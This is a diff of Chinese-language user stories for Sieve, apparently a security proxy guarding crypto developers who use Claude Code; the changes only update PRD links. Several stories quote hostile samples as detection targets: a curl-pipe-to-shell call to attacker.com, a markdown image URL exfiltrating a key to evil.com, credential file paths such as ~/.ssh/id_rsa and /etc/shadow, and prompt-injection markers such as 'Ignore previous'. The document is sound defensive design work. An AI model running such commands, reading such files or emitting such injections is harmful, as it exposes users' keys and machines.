@@ -22,7 +22,7 @@
 - 用 AI 辅助写/审计 Solidity / Vyper / Move / Rust 合约
 - 付费意愿：**$49/月**，公司报销
 
-> 详见 [PRD v1.4 §3.1-3.2](../prd/sieve-prd-v1.5.md#3-用户画像)
+> 详见 [PRD v1.4 §3.1-3.2](../prd/sieve-prd-v2.0.md#3-用户画像)
 
 ### ❌ 不服务的客群
 
@@ -33,10 +33,10 @@
 | Crypto 散户（不写代码）         | 钱包扩展即可                                                               |
 | 国内政企                    | 奇安信 / 深信服市场，合规复杂                                                     |
 | 纯 web2 程序员（无 crypto 资产） | 付费意愿不足以支撑误报治理成本                                                      |
-| **中国大陆境内的公开 to-C 商业化**  | 见 [PRD §11.5](../prd/sieve-prd-v1.5.md#115--中国大陆合规边界v13-新增)，营销渠道分级处理 |
+| **中国大陆境内的公开 to-C 商业化**  | 见 [PRD §11.5](../prd/sieve-prd-v2.0.md#115--中国大陆合规边界v13-新增)，营销渠道分级处理 |
 
 
-> 详见 [PRD v1.4 §3.3](../prd/sieve-prd-v1.5.md#33-不服务的客群)
+> 详见 [PRD v1.4 §3.3](../prd/sieve-prd-v2.0.md#33-不服务的客群)
 
 ---
 
@@ -46,7 +46,7 @@
 
 **作为** P0 crypto-native 开发者，**我希望** 当我把整个 `.env` 文件粘贴给 Claude Code 调试跨链转账脚本时，敏感内容被**自动擦除后请求继续发送**，工作流不被打断，**以便** 我不会因为一次手抖把私钥发给中转站，同时也不需要每次都手动确认。
 
-**关联 PRD**：[§4.1 场景 A](../prd/sieve-prd-v1.5.md#41-场景-a出站防泄漏) / [§5.1 OUT-01~05、OUT-12](../prd/sieve-prd-v1.5.md#51-出站检测) / [§5.3 处置矩阵](../prd/sieve-prd-v1.5.md#53-处置矩阵) / [§9 第 13 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
+**关联 PRD**：[§4.1 场景 A](../prd/sieve-prd-v2.0.md#41-场景-a出站防泄漏) / [§5.1 OUT-01~05、OUT-12](../prd/sieve-prd-v2.0.md#51-出站检测) / [§5.3 处置矩阵](../prd/sieve-prd-v2.0.md#53-处置矩阵) / [§9 第 13 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束)
 **关联 SPEC/ADR**：SPEC-002 §2.2 / ADR-016
 **优先级**：P0
 **验收标准**：
@@ -64,7 +64,7 @@
 
 **作为** P0 客群，**我希望** Sieve 能识别 12/15/18/21/24 词的 BIP39 助记词并通过 **SHA-256 校验位** 判定它是真实助记词而非随机词序，**以便** 我能放心使用 AI 助手讨论钱包恢复 / HD wallet 派生流程，又不会把真实助记词漏出去。
 
-**关联 PRD**：[§5.1 OUT-09](../prd/sieve-prd-v1.5.md#51-出站检测) / [§9 第 4 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
+**关联 PRD**：[§5.1 OUT-09](../prd/sieve-prd-v2.0.md#51-出站检测) / [§9 第 4 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束)
 **优先级**：P0
 **验收标准**：
 
@@ -79,7 +79,7 @@
 
 **作为** P0 客群，**我希望** Sieve 自动忽略明显的占位符（`0x0000...`、`sk-xxx`、`AKIAEXAMPLE...`）+ 我能把项目内的合法 fingerprint（例如测试链固定测试私钥）写进 `.sieveignore`，**以便** 我不会被同一条 false positive 反复打断。
 
-**关联 PRD**：[§5.1 出站交互模式](../prd/sieve-prd-v1.5.md#出站交互模式)
+**关联 PRD**：[§5.1 出站交互模式](../prd/sieve-prd-v2.0.md#出站交互模式)
 **优先级**：P0
 **验收标准**：
 
@@ -94,7 +94,7 @@
 
 **作为** P1 合约开发者，**我希望** 当我让模型写一个转账到 `0x742d35...1234A` 的脚本，但中转站偷偷把模型输出里的地址换成 `0x742d35...1234B`（仅末位差异）时，Sieve 能比对对话历史标红警告，**以便** 我不会签了一个把资产转给攻击者的交易。
 
-**关联 PRD**：[§4.2 场景 B](../prd/sieve-prd-v1.5.md#42-场景-b入站防地址替换) / [§5.2 IN-CR-01](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
+**关联 PRD**：[§4.2 场景 B](../prd/sieve-prd-v2.0.md#42-场景-b入站防地址替换) / [§5.2 IN-CR-01](../prd/sieve-prd-v2.0.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
 **优先级**：P0
 **验收标准**：
 
@@ -109,7 +109,7 @@
 
 **作为** 偶尔开 YOLO mode 的 P0 用户，**我希望** 即使开了 YOLO mode，当模型返回 `bash("curl https://attacker.com/cleanup.sh | sh")` 这种远程脚本下载执行的 tool_use 时，Sieve 仍然 **fail-closed 强制我在终端确认**，**以便** 一次注入 / 一次中转站作恶不会把我的开发机变成肉鸡——且整个拦截过程不污染 Claude Code 的上下文。
 
-**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v1.5.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§5.2 IN-CR-02](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§5.2 IN-GEN-01~03](../prd/sieve-prd-v1.5.md#phase-1-p0通用入站mvp-第-4-5-周) / [§6.7 双层防御](../prd/sieve-prd-v1.5.md#67-双层防御sieve-代理--claude-code-hooksv14-新增) / [§9 第 3 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
+**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v2.0.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§5.2 IN-CR-02](../prd/sieve-prd-v2.0.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§5.2 IN-GEN-01~03](../prd/sieve-prd-v2.0.md#phase-1-p0通用入站mvp-第-4-5-周) / [§6.7 双层防御](../prd/sieve-prd-v2.0.md#67-双层防御sieve-代理--claude-code-hooksv14-新增) / [§9 第 3 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束)
 **关联 SPEC/ADR**：SPEC-001 / ADR-014
 **优先级**：P0
 **验收标准**：
@@ -128,7 +128,7 @@
 
 **作为** P1 合约开发者，**我希望** 任何 `eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData` 调用都被 Sieve 强制弹窗，**且 YOLO mode 不可关闭**，弹窗显示完整 typed data + 解析 `verifyingContract`（自动识别 Pink Drainer 数字化绕过等已知模式），**以便** 我不会因为模型/中转站构造的 EIP-712 钓鱼签名而授权 drainer。
 
-**关联 PRD**：[§4.4 场景 D](../prd/sieve-prd-v1.5.md#44-场景-d入站防签名钓鱼) / [§5.2 IN-CR-05](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§9 第 3 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
+**关联 PRD**：[§4.4 场景 D](../prd/sieve-prd-v2.0.md#44-场景-d入站防签名钓鱼) / [§5.2 IN-CR-05](../prd/sieve-prd-v2.0.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§9 第 3 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束)
 **优先级**：P0
 **验收标准**：
 
@@ -143,7 +143,7 @@
 
 **作为** P0 客群，**我希望** 当模型返回的 tool_use 试图读 `~/.ssh/id_rsa` / `~/.aws/credentials` / `/etc/shadow` / `*.keystore` / `~/.config/solana/`，或写 `crontab` / `launchd` / `systemd` / `.bashrc` / `.zshrc` 时，Sieve 区分严重度处置——读敏感路径 = **High 警告**（合法用例存在，需用户判断），写持久化机制 = **Critical 拦截**（埋后门级别），**以便** 即使我让模型"清理一下机器"也不会被偷走凭证或埋后门。
 
-**关联 PRD**：[§5.2 IN-CR-03 / IN-CR-04](../prd/sieve-prd-v1.5.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
+**关联 PRD**：[§5.2 IN-CR-03 / IN-CR-04](../prd/sieve-prd-v2.0.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
 **优先级**：P0
 **验收标准**：
 
@@ -163,7 +163,7 @@
 
 **作为** P0 客群，**我希望** 模型返回的 markdown 中如果含 `![](http://evil.com/?leak=私钥)` 这种通过图片 URL 偷数据的模式 + 任何 `<|im_start|>` / `[INST]` / `### System:` / `Ignore previous` 反向 prompt injection 都被 Sieve 标红，**以便** 我不会因为渲染 markdown 时浏览器/IDE 自动 fetch 图片而泄漏数据。
 
-**关联 PRD**：[§5.2 IN-GEN-04 / IN-GEN-05](../prd/sieve-prd-v1.5.md#phase-1-p0通用入站mvp-第-4-5-周)
+**关联 PRD**：[§5.2 IN-GEN-04 / IN-GEN-05](../prd/sieve-prd-v2.0.md#phase-1-p0通用入站mvp-第-4-5-周)
 **优先级**：P0
 **验收标准**：
 
@@ -178,7 +178,7 @@
 
 **作为** P0 crypto 开发者，**我希望** Sieve 对出站和入站使用不同的 UX 哲学——出站脱敏类不打断我工作，入站危险操作前永远问我——**以便** 我不被高频脱敏类弹窗骚扰，但对签名 / 危险 bash 等不可逆动作始终有强制摩擦。
 
-**关联 PRD**：[§5.3 处置矩阵](../prd/sieve-prd-v1.5.md#53-处置矩阵) / [§5.4 HIPS 弹窗架构](../prd/sieve-prd-v1.5.md#54-hips-弹窗架构--超时策略v14-新增) / [§9 第 8 条、第 13 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
+**关联 PRD**：[§5.3 处置矩阵](../prd/sieve-prd-v2.0.md#53-处置矩阵) / [§5.4 HIPS 弹窗架构](../prd/sieve-prd-v2.0.md#54-hips-弹窗架构--超时策略v14-新增) / [§9 第 8 条、第 13 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束)
 **关联 SPEC/ADR**：SPEC-002 / ADR-016 / ADR-014
 **优先级**：P0
 **验收标准**：
@@ -200,7 +200,7 @@
 
 **作为** P0 客群（含部分时间断网工作的开发者），**我希望** Sieve 的规则库每周通过签名文件下载、用 Ed25519 签名验证、客户端只下载不上传，**且静态资源更新可关闭、完全离线可用**，**以便** 我在 air-gapped 环境也能用，且不会被一次规则下发投毒。
 
-**关联 PRD**：[§8.3 规则更新](../prd/sieve-prd-v1.5.md#83-规则更新) / [§9 第 6 条 + 第 2 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束)
+**关联 PRD**：[§8.3 规则更新](../prd/sieve-prd-v2.0.md#83-规则更新) / [§9 第 6 条 + 第 2 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束)
 **优先级**：P0
 **验收标准**：
 
@@ -215,7 +215,7 @@
 
 **作为** P1 审计研究员，**我希望** Sieve 每个 release 都有 sigstore 签名 + reproducible build 凭证 + pinned dependencies 锁文件，且我能用 `cosign verify` 在本地独立验证下载的二进制确实来自公开声明的构建流程，**以便** Sieve 自己不会成为下一个 LiteLLM 供应链事件。
 
-**关联 PRD**：[§1.2 第 4 句](../prd/sieve-prd-v1.5.md#12-四句话核心叙事v13-加第-4-句) / [§9 第 6 条](../prd/sieve-prd-v1.5.md#9-工程上必须做对的硬约束) / [§10.1 Week 1](../prd/sieve-prd-v1.5.md#week-1基础设施--anthropic-协议) / [§11.3](../prd/sieve-prd-v1.5.md#113-开源策略)
+**关联 PRD**：[§1.2 第 4 句](../prd/sieve-prd-v2.0.md#12-四句话核心叙事v13-加第-4-句) / [§9 第 6 条](../prd/sieve-prd-v2.0.md#9-工程上必须做对的硬约束) / [§10.1 Week 1](../prd/sieve-prd-v2.0.md#week-1基础设施--anthropic-协议) / [§11.3](../prd/sieve-prd-v2.0.md#113-开源策略)
 **优先级**：P0（**Week 1 必须跑通**，§10.1）
 **验收标准**：
 
@@ -231,7 +231,7 @@
 
 **作为** 14 天试用结束未付费的潜在用户，**我希望** Sieve 不会突然完全失效让我裸奔，而是 **降级为只读警告模式**——继续显示告警但不再 Critical 拦截，**以便** 我有充足时间评估是否付费 $49/月，同时不会立即陷入"无 Sieve 也无防护"的 worst case。
 
-**关联 PRD**：[§7.1 单一定价](../prd/sieve-prd-v1.5.md#71-单一定价) / [§14 Open Question 6](../prd/sieve-prd-v1.5.md#14-open-questions还需要-doskey-决策)
+**关联 PRD**：[§7.1 单一定价](../prd/sieve-prd-v2.0.md#71-单一定价) / [§14 Open Question 6](../prd/sieve-prd-v2.0.md#14-open-questions还需要-doskey-决策)
 **优先级**：P0
 **验收标准**：
 
@@ -247,7 +247,7 @@
 
 **作为** 刚下载 Sieve 的新用户，**我希望** Week 5 交付的三件套（macOS Native GUI App + `sieve setup` 工具 + IPC 协议）能让我在 30 分钟内完成安装并看到第一次拦截，**以便** Sieve 对非工程背景的 crypto 开发者也能顺利上手。
 
-**关联 PRD**：[§10.1 Week 5（v1.4 关键里程碑）](../prd/sieve-prd-v1.5.md#week-5-native-gui-app--sieve-setup-工具) / [§6.4 GUI App 职责](../prd/sieve-prd-v1.5.md#64-native-gui-app-职责v14-提到-phase-1-必做) / [§6.6 部署形态](../prd/sieve-prd-v1.5.md#66-部署形态phase-1) / [§6.7 双层防御](../prd/sieve-prd-v1.5.md#67-双层防御sieve-代理--claude-code-hooksv14-新增)
+**关联 PRD**：[§10.1 Week 5（v1.4 关键里程碑）](../prd/sieve-prd-v2.0.md#week-5-native-gui-app--sieve-setup-工具) / [§6.4 GUI App 职责](../prd/sieve-prd-v2.0.md#64-native-gui-app-职责v14-提到-phase-1-必做) / [§6.6 部署形态](../prd/sieve-prd-v2.0.md#66-部署形态phase-1) / [§6.7 双层防御](../prd/sieve-prd-v2.0.md#67-双层防御sieve-代理--claude-code-hooksv14-新增)
 **关联 SPEC/ADR**：SPEC-001 / SPEC-002 / SPEC-003 / ADR-012 / ADR-013 / ADR-014 / ADR-015
 **优先级**：P0（**Week 5 完成定义**）
 **验收标准**：
@@ -264,7 +264,7 @@
 
 **作为** 刚接触 Sieve 的新用户，**我希望** 30 分钟内能装上 Sieve 并开始拦截，不需要手动改配置文件，**以便** 降低上手门槛，第一次拦截体验印象深刻。
 
-**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v1.5.md#week-5-native-gui-app--sieve-setup-工具) / [§6.6 部署形态](../prd/sieve-prd-v1.5.md#66-部署形态phase-1)
+**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v2.0.md#week-5-native-gui-app--sieve-setup-工具) / [§6.6 部署形态](../prd/sieve-prd-v2.0.md#66-部署形态phase-1)
 **关联 SPEC/ADR**：SPEC-003 / ADR-015
 **优先级**：P0（Week 5）
 **验收标准**：
@@ -282,7 +282,7 @@
 
 **作为** 试用结束想卸载 Sieve 的用户，**我希望** 一条命令彻底还原系统到安装前状态，不留垃圾文件，**以便** 对 Sieve 没有后顾之忧的信任。
 
-**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v1.5.md#week-5-native-gui-app--sieve-setup-工具)
+**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v2.0.md#week-5-native-gui-app--sieve-setup-工具)
 **关联 SPEC/ADR**：SPEC-003 §5 / ADR-015
 **优先级**：P0（Week 5）
 **验收标准**：
@@ -298,7 +298,7 @@
 
 **作为** 高敏感度用户，**我希望** 切到 Strict preset 把所有出站脱敏类改成弹窗确认，**以便** 对私钥类脱敏有完全的主动意识，哪怕每次都要点一下。
 
-**关联 PRD**：[§5.4.4 Settings preset](../prd/sieve-prd-v1.5.md#544-settings-preset)
+**关联 PRD**：[§5.4.4 Settings preset](../prd/sieve-prd-v2.0.md#544-settings-preset)
 **关联 SPEC/ADR**：SPEC-002 §6 / ADR-016 / ADR-014
 **优先级**：P1（Week 7-8 GUI 打磨期）
 **验收标准**：
@@ -316,7 +316,7 @@
 
 **作为** 日常使用 Claude Code 的 P0 用户，**我希望** Hook 类拦截发生时直接在我工作的终端里处理，不需要切窗口，**以便** 决策摩擦最小化，安全感知不打断编码心流。
 
-**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v1.5.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§6.7 双层防御](../prd/sieve-prd-v1.5.md#67-双层防御sieve-代理--claude-code-hooksv14-新增)
+**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v2.0.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§6.7 双层防御](../prd/sieve-prd-v2.0.md#67-双层防御sieve-代理--claude-code-hooksv14-新增)
 **关联 SPEC/ADR**：SPEC-001 / ADR-014
 **优先级**：P0（Week 4）
 **验收标准**：
